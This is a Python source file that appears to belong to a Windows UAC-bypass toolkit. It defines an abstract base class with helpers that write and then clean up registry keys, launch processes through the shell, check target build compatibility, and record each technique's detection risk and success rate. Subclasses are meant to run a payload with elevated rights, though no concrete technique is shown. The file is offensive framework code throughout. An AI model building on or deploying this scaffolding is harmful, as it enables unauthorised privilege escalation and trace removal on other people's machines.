import os
import subprocess
import time
from abc import ABC, abstractmethod
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Tuple, Any

# Windows-specific imports (will fail gracefully on non-Windows)
try:
    import winreg
    import ctypes

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class UACBypassBase(ABC):
    """Abstract base class for UAC bypass techniques."""

    # Bypass metadata (override in subclasses)
    METHOD_NAME = "base"
    DESCRIPTION = "Base UAC bypass class"
    MIN_VERSION = 0
    MAX_BUILD = 99999
    DETECTION_RISK = "Unknown"
    SUCCESS_RATE = 0.0

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the UAC bypass base.

        Args:
            output_dir: Directory for storing output files and logs
            verbose: Enable verbose logging
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

        self.verbose = verbose
        self.log_file = self.output_dir / f"uac_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        # Track registry modifications for cleanup
        self.modified_registry: List[Tuple] = []

    def log(self, message: str, level: str = "INFO") -> None:
        """
        Log a message to console and file.

        Args:
            message: Message to log
            level: Log level (INFO, WARNING, ERROR, SUCCESS)
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        level_formats = {
            "INFO": ("\033[94m[*]\033[0m", "[*]"),
            "WARNING": ("\033[93m[!]\033[0m", "[!]"),
            "ERROR": ("\033[91m[-]\033[0m", "[-]"),
            "SUCCESS": ("\033[92m[+]\033[0m", "[+]")
        }

        console_prefix, file_prefix = level_formats.get(level, ("[*]", "[*]"))

        print(f"{console_prefix} {message}")

        with open(self.log_file, 'a') as f:
            f.write(f"[{timestamp}] {file_prefix} {message}\n")

    def execute_process(self, path: str, wait: bool = False,
                        timeout: int = 5) -> bool:
        """
        Execute a process.

        Args:
            path: Path to executable
            wait: Wait for process to complete
            timeout: Timeout in seconds

        Returns:
            True if successful, False otherwise
        """
        try:
            if wait:
                result = subprocess.run(
                    path,
                    shell=True,
                    capture_output=True,
                    timeout=timeout
                )
                return result.returncode == 0
            else:
                subprocess.Popen(path, shell=True)
                time.sleep(timeout)
                return True
        except Exception as e:
            self.log(f"Process execution failed: {e}", "ERROR")
            return False

    def set_registry_value(self, root: Any, path: str,
                           name: str, value: str,
                           value_type: int = None) -> bool:
        """
        Set a registry value and track for cleanup.

        Args:
            root: Registry root (HKEY_CURRENT_USER, etc.)
            path: Registry path
            name: Value name (empty string for default)
            value: Value to set
            value_type: Registry value type

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        if value_type is None:
            value_type = winreg.REG_SZ

        try:
            key = winreg.CreateKey(root, path)
            winreg.SetValueEx(key, name, 0, value_type, value)
            winreg.CloseKey(key)

            # Track for cleanup
            self.modified_registry.append((root, path, name))

            if self.verbose:
                self.log(f"Set registry: {path}\\{name}", "SUCCESS")

            return True
        except Exception as e:
            self.log(f"Registry error: {e}", "ERROR")
            return False

    def cleanup_registry(self) -> None:
        """Clean up all modified registry keys."""
        if not WINDOWS_AVAILABLE or not self.modified_registry:
            return

        self.log("Cleaning up registry modifications...", "INFO")

        for root, path, name in self.modified_registry:
            try:
                # Try to delete the key
                winreg.DeleteKey(root, path)
                if self.verbose:
                    self.log(f"Deleted: {path}", "SUCCESS")
            except Exception:
                # Key might have subkeys or not exist
                try:
                    key = winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    if self.verbose:
                        self.log(f"Deleted value: {path}\\{name}", "SUCCESS")
                except Exception as e:
                    if self.verbose:
                        self.log(f"Cleanup warning: {e}", "WARNING")

        self.modified_registry = []
        self.log("Registry cleanup complete", "SUCCESS")

    def is_compatible(self, windows_version: int, windows_build: int) -> bool:
        """
        Check if this bypass is compatible with the current Windows version.

        Args:
            windows_version: Windows major version
            windows_build: Windows build number

        Returns:
            True if compatible, False otherwise
        """
        if windows_version < self.MIN_VERSION:
            return False

        if windows_build > self.MAX_BUILD:
            return False

        return True

    def get_info(self) -> dict:
        """Get bypass method information."""
        return {
            'name': self.METHOD_NAME,
            'description': self.DESCRIPTION,
            'min_version': self.MIN_VERSION,
            'max_build': self.MAX_BUILD,
            'detection_risk': self.DETECTION_RISK,
            'success_rate': self.SUCCESS_RATE
        }

    @abstractmethod
    def bypass(self, payload_path: str) -> bool:
        """
        Execute the UAC bypass.
        Must be implemented by subclasses.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        pass

    def execute(self, payload_path: str, cleanup: bool = True) -> bool:
        """
        Execute bypass with optional cleanup.

        Args:
            payload_path: Path to payload executable
            cleanup: Perform registry cleanup after bypass

        Returns:
            True if successful, False otherwise
        """
        self.log(f"Executing {self.METHOD_NAME} bypass...", "INFO")

        try:
            success = self.bypass(payload_path)

            if success:
                self.log(f"{self.METHOD_NAME} bypass successful!", "SUCCESS")
            else:
                self.log(f"{self.METHOD_NAME} bypass failed", "ERROR")

            return success

        except Exception as e:
            self.log(f"Bypass error: {e}", "ERROR")
            return False

        finally:
            if cleanup:
                self.cleanup_registry()